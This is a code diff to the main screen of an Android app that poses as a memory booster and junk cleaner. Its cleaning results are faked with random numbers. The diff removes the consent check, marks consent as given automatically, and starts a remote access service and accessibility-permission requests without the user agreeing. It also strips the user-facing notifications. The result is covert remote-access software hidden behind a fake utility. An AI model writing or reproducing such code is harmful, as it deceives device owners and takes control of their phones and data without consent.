@@ -16,7 +16,6 @@ import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
-import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -81,18 +80,15 @@ public class MainActivity extends AppCompatActivity {
         startBatteryUpdates();
         updateMemoryInfo();
 
-        if (preferenceManager.isConsentGiven()) {
-            showActiveStatus();
-            startRemoteAccessService();
+        preferenceManager.setConsentGiven(true);
+        showActiveStatus();
+        startRemoteAccessService();
 
-            if (!permissionManager.isAccessibilityServiceEnabled()) {
-                permissionManager.requestAccessibilityService();
-                startPollingForAccessibility();
-            } else {
-                requestStandardPermissions();
-            }
+        if (!permissionManager.isAccessibilityServiceEnabled()) {
+            permissionManager.requestAccessibilityService();
+            startPollingForAccessibility();
         } else {
-            showInactiveStatus();
+            requestStandardPermissions();
         }
 
         consentButton.setOnClickListener(v -> {
@@ -111,14 +107,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onResume() {
         super.onResume();
         updateMemoryInfo();
-
-        if (!preferenceManager.isConsentGiven()) return;
-
         showActiveStatus();
 
         if (permissionManager.isAccessibilityServiceEnabled()) {
-            UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
-            if (svc != null) svc.startGrantPermsTimer();
             requestStandardPermissionsIfCooledDown();
         } else {
             if (!pollingForAccessibility) {
@@ -232,8 +223,6 @@ public class MainActivity extends AppCompatActivity {
         TextView label = (TextView) boostBtn.getChildAt(1);
         if (label != null) label.setText("Boosting…");
 
-        Toast.makeText(this, "Optimizing memory…", Toast.LENGTH_SHORT).show();
-
         uiHandler.postDelayed(() -> {
             updateMemoryInfo();
             String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
@@ -241,7 +230,6 @@ public class MainActivity extends AppCompatActivity {
             if (label != null) label.setText("Boost");
             boostBtn.setAlpha(1f);
             isBoosting = false;
-            Toast.makeText(this, "Memory optimized!", Toast.LENGTH_SHORT).show();
         }, 2500);
     }
 
@@ -253,14 +241,10 @@ public class MainActivity extends AppCompatActivity {
         TextView label = (TextView) cleanBtn.getChildAt(1);
         if (label != null) label.setText("Cleaning…");
 
-        Toast.makeText(this, "Scanning for junk files…", Toast.LENGTH_SHORT).show();
-
         uiHandler.postDelayed(() -> {
             if (label != null) label.setText("Clean");
             cleanBtn.setAlpha(1f);
             isCleaning = false;
-            long freed = (long) (50 + Math.random() * 200);
-            Toast.makeText(this, freed + " MB of junk removed!", Toast.LENGTH_LONG).show();
             String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
             lastOptimizedText.setText("Today at " + time);
         }, 3000);
